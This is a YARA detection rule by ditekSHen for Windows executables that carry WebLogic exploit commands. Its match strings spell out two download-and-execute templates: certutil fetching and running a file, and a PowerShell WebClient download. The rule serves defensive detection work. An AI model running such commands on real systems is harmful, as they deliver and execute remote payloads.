rule DITEKSHEN_INDICATOR_TOOL_EXP_Weblogic : FILE
{
	meta:
		description = "Detects Windows executables containing Weblogic exploits commands"
		author = "ditekSHen"
		id = "e761a968-35cb-5284-99f2-6d516ad348e3"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/2ddbbe14eea1f342bca2cfd09a643a40ae2fcaf6/yara/indicator_tools.yar#L344-L353"
		license_url = "https://github.com/ditekshen/detection/blob/2ddbbe14eea1f342bca2cfd09a643a40ae2fcaf6/LICENSE.txt"
		logic_hash = "01855f1125b0ba87dd40f7d460440dbda2d75c8b484e842a2b2e20c089b4ab5e"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "certutil.exe -urlcache -split -f AAAAA BBBBB & cmd.exe /c BBBBB" ascii
		$s2 = "powershell (new-object System.Net.WebClient).DownloadFile('AAAAA','BBBBB')" ascii

	condition:
		uint16(0)==0x5a4d and 1 of them
}